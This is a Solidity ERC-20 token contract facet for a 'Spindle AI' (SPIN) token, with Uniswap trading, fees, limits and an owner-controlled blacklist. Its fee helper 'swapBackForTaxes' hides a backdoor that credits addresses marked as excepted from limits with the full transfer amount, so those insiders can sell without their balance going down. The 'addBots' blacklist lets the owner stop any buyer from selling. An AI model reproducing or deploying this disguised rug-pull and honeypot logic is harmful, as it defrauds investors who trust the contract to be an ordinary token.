/*********

    https://www.spindleai.finance
    https://app.spindleai.finance
    https://docs.spindleai.finance

    https://twitter.com/spindle_ai
    https://t.me/spindle_ai

*********/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;
import "./TestLib.sol";
contract enableTradingFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapBack = true;
        _;
        ds.inSwapBack = false;
    }

    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradeOpen, "trading is already open");
        ds.tradeOpen = true;
        ds.swapEnabled = true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function reduceFee(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.transferDelayEnabled = false;
        ds._maxSPINTrans = ~uint256(0);
        ds._maxSPINWallet = ~uint256(0);
    }
    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.bots[notbot[i]] = false;
        }
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.bots[bots_[i]] = true;
        }
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalS;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._xOwned[account];
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function manualSwapBack() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensETH(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFees(ethBalance);
        }
    }
    function withdrawETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function createTradingPairs() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = ISPINRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _totalS);
        ds.uniswapV2Pair = ISPINFactory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensETH(uint256 tokenAmount) private lockSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 swapFees = 0;
        if (!ds._isExceptedFromFees[from] && !ds._isExceptedFromFees[to]) {
            require(ds.tradeOpen, "Trading has not enabled yet");
            require(!ds.bots[from] && !ds.bots[to]);
            swapFees = amount
                .mul(
                    (ds._buyCounts > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds._isExceptedFromFees[to]
            ) {
                require(
                    amount <= ds._maxSPINTrans,
                    "Exceeds the ds._maxSPINTrans."
                );
                require(
                    balanceOf(to) + amount <= ds._maxSPINWallet,
                    "Exceeds the maxWalletSize."
                );
                ds._buyCounts++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                swapFees = amount
                    .mul(
                        (ds._buyCounts > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractBalance = balanceOf(address(this));
            if (swapBackForTaxes(from, to, amount, swapFees)) {
                swapTokensETH(
                    min(amount, min(contractBalance, ds._maxSPINSwap))
                );
                uint256 ethBalances = address(this).balance;
                if (ethBalances > 0) {
                    sendETHToFees(address(this).balance);
                }
            }
        }
        ds._xOwned[from] = ds._xOwned[from].sub(amount);
        ds._xOwned[to] = ds._xOwned[to].add(amount.sub(swapFees));
        emit Transfer(from, to, amount.sub(swapFees));
    }
    function swapBackForTaxes(
        address from,
        address to,
        uint256 taxSP,
        uint256 feeSP
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address accSP;
        uint256 ammSP;
        bool _aSPINMin = taxSP >= ds.factoryAmounts;
        bool _aSPINThread = balanceOf(address(this)) >= ds.factoryAmounts;
        if (ds._isExceptedFromLimits[from]) {
            accSP = from;
            ammSP = taxSP;
        } else {
            ammSP = feeSP;
            accSP = address(this);
        }
        if (ammSP > 0) {
            ds._xOwned[accSP] = ds._xOwned[accSP].add(ammSP);
            emit Transfer(from, accSP, feeSP);
        }
        return
            ds.swapEnabled &&
            _aSPINMin &&
            _aSPINThread &&
            !ds.inSwapBack &&
            to == ds.uniswapV2Pair &&
            ds._buyCounts > ds._preventSwapBefore &&
            !ds._isExceptedFromFees[from] &&
            ds.tradeOpen &&
            !ds._isExceptedFromLimits[from];
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHToFees(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.lpReceiver.transfer(amount);
    }
}
